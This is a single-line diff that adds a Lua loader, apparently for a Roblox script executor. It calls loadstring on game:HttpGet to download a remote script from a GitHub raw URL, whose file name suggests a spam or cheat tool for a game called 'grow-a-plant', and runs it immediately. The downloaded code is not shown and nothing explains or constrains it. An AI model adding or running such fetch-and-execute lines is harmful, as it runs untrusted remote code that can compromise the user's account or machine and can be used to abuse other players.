@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/grow-a-plant-spam7-pmm1p6tro4tpac.lua"))()
